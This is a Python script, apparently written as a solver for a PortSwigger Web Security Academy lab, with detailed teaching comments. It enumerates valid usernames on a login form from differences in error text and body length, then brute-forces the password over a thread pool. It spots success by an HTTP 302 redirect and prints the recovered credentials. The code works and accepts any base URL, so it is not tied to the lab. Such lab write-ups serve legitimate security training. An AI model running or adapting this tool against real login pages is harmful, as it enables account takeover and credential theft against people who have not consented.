#!/usr/bin/env python3
"""
=====================================================================
Solver for PortSwigger lab:
  "Username enumeration via different responses"
  https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
=====================================================================

WHY THIS LAB EXISTS / WHAT THE VULNERABILITY IS
------------------------------------------------
A well-designed login form returns the SAME error message whether the
username is wrong, the password is wrong, or both. That way an attacker
who guesses random usernames can't tell which ones are real accounts.

This lab does it WRONG: when you submit a valid username with a wrong
password, the server says "Incorrect password". When you submit an
invalid username, it says "Invalid username". The two responses differ
in body length AND in the error text.

Why that matters:
  - Attacker sends one request per candidate username with a junk pw.
  - The valid username's response stands out (different text + length).
  - Once a valid username is known, the attacker brute-forces just
    that one account's password instead of guessing every combination.

This is called USERNAME ENUMERATION. It dramatically shrinks the
search space of a credential-stuffing or brute-force attack.

WHAT THIS SCRIPT DOES
---------------------
Phase 1 - Username enumeration:
    For each candidate username, send POST /login with a long random
    junk password. Record (status code, body length, error message) as
    a "fingerprint" of the response. The valid username is the one
    whose fingerprint is UNIQUE among all responses.

Phase 2 - Password brute-force:
    With the valid username in hand, try each candidate password. The
    successful login is the one that returns HTTP 302 (redirect to
    /my-account) instead of HTTP 200 (an error page).

WHY NOT USE BURP INTRUDER?
--------------------------
Burp Suite's Intruder feature does exactly this kind of attack. The
Community (free) edition deliberately throttles it to ~1 request every
few seconds, so this lab would take ~10 minutes per phase. Burp Pro
removes the throttle but costs money.

The lab server itself does NOT rate-limit, so a Python script using
`requests` + a small thread pool finishes both phases in a few seconds.
"""

# ---------------------------------------------------------------------
# IMPORTS
# ---------------------------------------------------------------------
# Standard-library modules (ship with Python, no install needed):
import argparse                              # parses CLI flags like --workers
import re                                    # regex - used to pull the error message out of HTML
import sys                                   # used for sys.exit() to bail with a nonzero exit code
from collections import Counter              # counts how many times each unique value appears
from concurrent.futures import (             # high-level threading API
    ThreadPoolExecutor,                      # manages a pool of worker threads
    as_completed,                            # yields futures in the order they finish
)
from pathlib import Path                     # nicer file-path object than raw strings
from urllib.parse import urlparse            # validates the user-supplied lab URL

# Third-party (install via:  pip install requests):
import requests                              # popular HTTP client library
from requests.adapters import HTTPAdapter    # lets us tune the connection pool


# ---------------------------------------------------------------------
# REGEX FOR EXTRACTING THE LOGIN ERROR MESSAGE
# ---------------------------------------------------------------------
# PortSwigger renders login errors in HTML like this:
#     <p class=is-warning>Invalid username</p>
# (Note: their HTML uses class=is-warning without quotes - that's valid
#  HTML5 for attribute values without spaces/special chars.)
#
# Pattern breakdown:
#   <p\s+class=is-warning>   match literal "<p", one-or-more whitespace,
#                            then the literal `class=is-warning>`
#   ([^<]+)                  capture group 1: one or more chars that
#                            are NOT `<` - i.e. the message text itself,
#                            stopping at the start of `</p>`
#   </p>                     match the closing tag
#
# re.IGNORECASE makes it case-insensitive (defensive - in case the lab
# markup ever changes to `<P CLASS=...>` etc).
#
# We compile it ONCE here at module load instead of inside the function,
# so Python doesn't re-parse the pattern on every request. Small win
# but free.
# ---------------------------------------------------------------------
ERROR_RE = re.compile(r"<p\s+class=is-warning>([^<]+)</p>", re.IGNORECASE)


def build_session(workers: int) -> requests.Session:
    """
    Build a requests.Session tuned for fast parallel use.

    WHY USE A SESSION INSTEAD OF requests.post() EACH TIME?
        A Session keeps a pool of open TCP connections to the server.
        Each request reuses an existing connection instead of doing
        a fresh TCP+TLS handshake every time. For 100+ requests to
        the same host this is a 5-10x speedup.

    WHY TUNE THE HTTPAdapter POOL?
        urllib3 (which `requests` uses under the hood) defaults to
        a pool size of 10. If we have more worker threads than that,
        the extras log a warning and tear down + rebuild connections
        every time. Setting pool_maxsize == workers gives every
        thread its own persistent connection.
    """
    s = requests.Session()

    # pool_connections = how many distinct hostname pools we keep
    # pool_maxsize    = max simultaneous connections per host pool
    # We size both to `workers` so the pool exactly matches concurrency.
    adapter = HTTPAdapter(pool_connections=workers, pool_maxsize=workers)
    s.mount("http://", adapter)     # apply to all http:// URLs
    s.mount("https://", adapter)    # apply to all https:// URLs

    # Custom User-Agent makes our traffic identifiable in any logs.
    # PortSwigger labs don't care, but it's good hygiene - we're not
    # pretending to be a browser.
    s.headers.update({"User-Agent": "portswigger-lab-solver/1.0"})

    return s


def post_login(session, base_url, username, password):
    """
    Send a single POST /login attempt. Returns the raw Response object.

    KEY DETAIL #1: allow_redirects=False
        On a SUCCESSFUL login the server returns HTTP 302 with a
        `Location: /my-account` header. By default `requests` will
        AUTOMATICALLY follow that redirect, fetch /my-account, and
        hand us a 200 OK response. That would hide our success signal -
        both successful and failed logins would look like status 200.
        Setting allow_redirects=False gives us the raw 302 so we can
        actually detect success.

    KEY DETAIL #2: timeout=20
        Without an explicit timeout, a hung request can block a worker
        thread forever. 20s is generous for a lab; lower it for faster
        failure if the lab session is dead.
    """
    return session.post(
        f"{base_url}/login",
        # `data=` sends a form-encoded body (application/x-www-form-urlencoded).
        # That's what HTML forms submit by default.
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=20,
    )


def extract_error(html: str) -> str:
    """
    Pull the error message text out of a login response.

    Returns "Invalid username", "Incorrect password", or "" if nothing
    matched (e.g. for a 302 redirect or a 504 timeout page).

    Empty-string fallback is important: even responses without an error
    block still get a consistent fingerprint, instead of crashing or
    producing garbage.
    """
    m = ERROR_RE.search(html)
    # .group(1) returns capture group 1 (the message text);
    # .strip() removes any stray whitespace around it.
    # Walrus-style conditional: return the value if found, else "".
    return m.group(1).strip() if m else ""


def read_wordlist(path: Path) -> list[str]:
    """
    Load a wordlist: one entry per line. Trim whitespace, drop blanks.

    The nested-comprehension below is equivalent to:
        result = []
        for line in path.read_text().splitlines():
            word = line.strip()
            if word:                # skip blank lines
                result.append(word)
        return result
    """
    return [w for w in (line.strip() for line in path.read_text().splitlines()) if w]


# =====================================================================
# PHASE 1: USERNAME ENUMERATION
# =====================================================================
def enumerate_username(base_url, usernames, dummy_password, workers):
    """
    Find a valid username by probing every candidate with a junk
    password and looking for the response that DIFFERS from all the
    others.

    The Counter-based outlier detection is the heart of the attack.
    """
    print(f"[*] phase 1: probing {len(usernames)} usernames with {workers} workers")
    session = build_session(workers)

    # `results` maps each username to its response fingerprint:
    #   {
    #     "carlos": (200, 3168, "Invalid username"),
    #     "admin":  (200, 3170, "Incorrect password"),  <-- the valid one
    #     ...
    #   }
    # Type hint is just for human readers (Python doesn't enforce it).
    results: dict[str, tuple[int, int, str]] = {}

    def probe(u):
        """
        Inner function run by each worker thread. Sends one login
        attempt and returns (username, status, body_length, error_msg).

        Defined INSIDE enumerate_username so it has automatic access to
        `session`, `base_url`, and `dummy_password` via closure - we
        don't have to pass them in as arguments.
        """
        r = post_login(session, base_url, u, dummy_password)
        # len(r.content) counts BYTES of the body; len(r.text) would
        # count characters after decoding. For fingerprinting we want
        # raw byte length - it's what the server actually sent.
        return u, r.status_code, len(r.content), extract_error(r.text)

    # ThreadPoolExecutor manages a pool of `workers` threads for us.
    # The `with` block ensures threads are joined + cleaned up on exit.
    with ThreadPoolExecutor(max_workers=workers) as ex:
        # Pattern:
        #   1. [ex.submit(probe, u) for u in usernames]
        #         submits one task per username; returns a Future object
        #         for each. The pool starts running them in parallel.
        #   2. as_completed(...) yields each Future as it finishes
        #         (in COMPLETION order, not submission order - depends
        #         on network timing).
        #   3. fut.result() unwraps the return value of probe()
        #         (or re-raises any exception probe() threw).
        for fut in as_completed([ex.submit(probe, u) for u in usernames]):
            u, status, length, msg = fut.result()
            results[u] = (status, length, msg)

    # -----------------------------------------------------------------
    # OUTLIER DETECTION
    # -----------------------------------------------------------------
    # Count how many usernames share each unique fingerprint.
    # Counter is a dict subclass; this produces something like:
    #   {
    #     (200, 3168, "Invalid username"):   100,   <-- baseline (invalid users)
    #     (200, 3170, "Incorrect password"): 1,     <-- our outlier (valid user)
    #   }
    counts = Counter(results.values())

    # The valid username is the one whose fingerprint appears EXACTLY
    # ONCE. The 100 invalid usernames all share the same "Invalid
    # username" fingerprint, so their count is 100.
    unique = [fp for fp, c in counts.items() if c == 1]

    # ---- FAILURE MODE 1: no outlier found ----
    # Every response fingerprint appeared multiple times. Usually means:
    #   - Lab session expired (504 Gateway Timeout for every request)
    #   - Wrong URL (404 for every request)
    #   - Server returning a generic error page regardless of input
    if not unique:
        print("[-] no outlier found - every response looked identical.")
        # Show 3 sample fingerprints so the user can diagnose what's
        # actually coming back from the server.
        for u, fp in list(results.items())[:3]:
            print(f"    sample: {u!r} -> {fp}")
        return None

    # ---- FAILURE MODE 2: multiple unique fingerprints ----
    # If MORE than one fingerprint appears once, the server is producing
    # per-request variation in its responses - e.g. a CSRF token in the
    # HTML that's regenerated for every response, making every body
    # length slightly different. The fingerprint logic would need to be
    # smarter (strip the dynamic parts) to handle this. This lab
    # shouldn't hit this case.
    if len(unique) > 1:
        print(f"[!] {len(unique)} outliers - server may be noisy. Candidates:")
        for fp in unique:
            for u, r in results.items():
                if r == fp:
                    print(f"    {u!r}  fingerprint={fp}")
        return None

    # ---- SUCCESS PATH ----
    fingerprint = unique[0]
    # Find the username whose response matches the unique fingerprint.
    # `next(...)` returns the first item from the generator expression.
    valid = next(u for u, r in results.items() if r == fingerprint)

    # counts.most_common(1) returns the single most-common fingerprint -
    # i.e. what "invalid username" responses look like. We print it as
    # the baseline so the user can see what we keyed on.
    baseline = counts.most_common(1)[0][0]
    print(f"[+] valid username: {valid!r}")
    print(f"    outlier  : status={fingerprint[0]} len={fingerprint[1]} msg={fingerprint[2]!r}")
    print(f"    baseline : status={baseline[0]}  len={baseline[1]}  msg={baseline[2]!r}")
    return valid


# =====================================================================
# PHASE 2: PASSWORD BRUTE-FORCE
# =====================================================================
def brute_password(base_url, username, passwords, workers):
    """
    Given a valid username, try each candidate password until the
    server returns HTTP 302 (success - we're being redirected to
    /my-account).

    This phase stops as soon as the password is found instead of
    waiting for every probe to finish.
    """
    print(f"[*] phase 2: trying {len(passwords)} passwords against {username!r}")
    session = build_session(workers)

    # `str | None` is Python 3.10+ syntax for "either str or None".
    # Equivalent to the older Optional[str].
    found: str | None = None

    def probe(p):
        r = post_login(session, base_url, username, p)
        # Capture the Location header too so we can print where the
        # redirect points - a sanity check that we're actually being
        # sent to /my-account, not to some error page.
        return p, r.status_code, r.headers.get("Location", "")

    with ThreadPoolExecutor(max_workers=workers) as ex:
        # `futures` is a {Future: password} dict here. We use a dict
        # (not a list) so we can iterate to .cancel() everything once
        # we've won.
        futures = {ex.submit(probe, p): p for p in passwords}

        for fut in as_completed(futures):
            p, status, location = fut.result()

            # HTTP 302 = redirect = successful login.
            # The server is sending us to /my-account (or whatever the
            # Location header says).
            if status == 302:
                found = p
                print(f"[+] password found: {p!r}  -> redirect to {location!r}")

                # Cancel queued probes so we don't keep hammering the
                # server after we've already won.
                # NOTE: .cancel() only stops futures that haven't STARTED
                # yet. Requests already in-flight will still finish - but
                # the pool won't pick up any new ones.
                for f in futures:
                    f.cancel()
                break   # stop reading from as_completed

    return found


# =====================================================================
# CLI ENTRYPOINT
# =====================================================================
def main():
    """
    Parse arguments, run Phase 1, run Phase 2, print credentials.
    """
    # argparse turns this docstring + the add_argument() calls below into
    # a proper --help message AND validates the user's CLI input.
    ap = argparse.ArgumentParser(
        description=__doc__,
        # Tell argparse not to reformat the description - preserves the
        # multi-line layout of our module docstring at the top of the
        # file.
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    # Positional args (required, in order):
    ap.add_argument("base_url",
                    help="Lab base URL, e.g. https://0a1b...web-security-academy.net")
    ap.add_argument("usernames", type=Path,
                    help="Path to username wordlist")
    ap.add_argument("passwords", type=Path,
                    help="Path to password wordlist")
    # Optional flags (have a default, override with --flag value):
    ap.add_argument(
        "--dummy-password",
        # Long random string so it can't accidentally collide with a
        # real password during Phase 1. If our dummy password HAPPENED
        # to be correct for a real user, that user's response would
        # be a 302 (not "Incorrect password"), and the outlier logic
        # would either miss them or flag them weirdly.
        default="not-a-real-password-xkcd-correct-horse-battery-staple-2026",
        help="Password used during the username-probing phase",
    )
    ap.add_argument("--workers", type=int, default=10,
                    help="Concurrent requests (default 10)")
    args = ap.parse_args()

    # ---- URL normalization ----
    # Accept whatever the user pasted (e.g. with a path or query string)
    # and strip it down to scheme + host only.
    parsed = urlparse(args.base_url)
    if not parsed.scheme or not parsed.netloc:
        # sys.exit() with a string prints to stderr and exits with code 1.
        sys.exit("base_url must include scheme + host, e.g. https://0a1b...web-security-academy.net")
    base = f"{parsed.scheme}://{parsed.netloc}"

    # ---- Load wordlists from disk ----
    usernames = read_wordlist(args.usernames)
    passwords = read_wordlist(args.passwords)

    # ---- Phase 1: find a valid username ----
    user = enumerate_username(base, usernames, args.dummy_password, args.workers)
    if not user:
        # Phase 1 failed - exit early so we don't try Phase 2 with no target.
        sys.exit(1)

    # ---- Phase 2: brute-force the password ----
    pw = brute_password(base, user, passwords, args.workers)
    if not pw:
        print("[-] no password matched.")
        sys.exit(1)

    # ---- Final output ----
    print()
    print(f"=== credentials: {user}:{pw} ===")


# Standard Python idiom: only run main() if this file is being executed
# directly as a script. If it's imported as a module (`import
# username_enum_solver`), __name__ will be "username_enum_solver" and
# this block is skipped, so the imports/functions are available without
# the side effect of running the CLI.
if __name__ == "__main__":
    main()
